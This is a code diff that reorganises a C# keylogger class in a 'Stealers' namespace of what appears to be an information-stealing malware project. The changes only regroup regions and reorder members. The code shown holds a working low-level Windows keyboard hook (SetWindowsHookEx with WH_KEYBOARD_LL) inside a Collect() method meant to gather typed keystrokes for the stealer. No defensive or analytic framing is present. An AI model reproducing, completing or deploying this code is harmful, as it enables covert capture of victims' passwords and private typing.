@@ -1,8 +1,12 @@
-﻿using System;
+﻿#region Imports
+
+using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using sub.Util.Misc;
+
+#endregion
 
 namespace sub.Stealers
 {
@@ -13,8 +17,8 @@ namespace sub.Stealers
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const int WM_KEYUP = 0x0101;
-        private LowLevelKeyboardProc _proc;
         private IntPtr _hookID = IntPtr.Zero;
+        private LowLevelKeyboardProc _proc;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
@@ -41,9 +45,6 @@ namespace sub.Stealers
             }
         }
 
-        private delegate IntPtr LowLevelKeyboardProc(
-            int nCode, IntPtr wParam, IntPtr lParam);
-
         private IntPtr HookCallback(
             int nCode, IntPtr wParam, IntPtr lParam)
         {
@@ -61,19 +62,15 @@ namespace sub.Stealers
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
+        private delegate IntPtr LowLevelKeyboardProc(
+            int nCode, IntPtr wParam, IntPtr lParam);
+
         #endregion
 
+        private bool _capslock;
         private string _name = "Keylogger";
 
-        public string Name
-        {
-            get { return _name; }
-            set { _name = value; }
-        }
-        public string Data { get; set; }
-
         private bool _shift;
-        private bool _capslock;
 
         public Keylogger()
         {
@@ -82,12 +79,24 @@ namespace sub.Stealers
             _capslock = false;
         }
 
+        #region IStealer Members
+
+        public string Name
+        {
+            get { return _name; }
+            set { _name = value; }
+        }
+
+        public string Data { get; set; }
+
         public void Collect()
         {
             _hookID = SetHook(_proc);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
+
+        #endregion
 
         private void ProcessKeyDown(int code)
         {
